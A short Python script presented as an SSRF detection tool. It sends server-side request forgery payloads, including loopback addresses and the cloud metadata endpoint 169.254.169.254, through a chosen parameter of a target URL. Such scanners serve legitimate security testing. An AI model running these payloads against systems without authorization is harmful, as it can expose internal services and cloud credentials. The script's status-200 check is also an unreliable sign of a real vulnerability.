import requests
import argparse

# List of SSRF test payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8000",
    "http://[::1]:80",
    "http://internal-service:8080"
]

def test_ssrf(url, param):
    """Injects SSRF payloads into the target parameter and checks for responses."""
    for payload in SSRF_PAYLOADS:
        test_params = {param: payload}
        response = requests.get(url, params=test_params)
        
        if response.status_code == 200:
            print(f"[!] Potential SSRF detected: {url} with payload {payload}")
        else:
            print(f"[-] No SSRF detected with payload: {payload}")

def main():
    parser = argparse.ArgumentParser(description="SSRF Detection Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", required=True, help="Parameter name to inject SSRF payloads")
    args = parser.parse_args()
    
    print("[+] Scanning for SSRF...")
    test_ssrf(args.url, args.param)
    print("[+] Scan Complete!")

if __name__ == "__main__":
    main()
